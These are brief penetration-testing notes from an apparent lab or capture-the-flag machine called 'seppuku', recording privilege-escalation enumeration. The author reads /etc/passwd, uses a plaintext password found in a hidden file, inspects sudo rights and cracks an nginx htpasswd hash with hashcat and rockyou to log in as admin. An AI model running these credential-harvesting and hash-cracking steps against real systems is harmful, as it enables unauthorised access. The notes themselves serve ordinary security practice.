# 7 box enum seppuku

```
# seppuku:eeyoree

seppuku@seppuku:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[truncated]
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
samurai:x:1001:1002:,,,:/home/samurai:/bin/rbash
tanto:x:1002:1003:,,,:/home/tanto:/bin/rbas

seppuku@seppuku:~$ cat .passwd
12345685213456!@!@A
# works for samurai user

seppuku@seppuku:~$ sudo -l
Matching Defaults entries for seppuku on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seppuku may run the following commands on seppuku:
    (ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/
	
# this will basically create a symlink /tmp/root that points to /root/

seppuku@seppuku:/tmp$ ls -la /tmp/root
lrwxrwxrwx 1 root root 6 Aug 27 01:40 /tmp/root -> /root/

# but we cant read anything due to perms
seppuku@seppuku:/tmp$ ls -la /tmp/root/
ls: cannot open directory '/tmp/root/': Permission denied
```

### PEAS

```
╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 44 May 13  2020 /etc/nginx/.htpasswd
admin:$apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1

$ hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt --show
$apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1:Football
# admin:Football works on http://192.168.131.90/
# basic auth successful
```
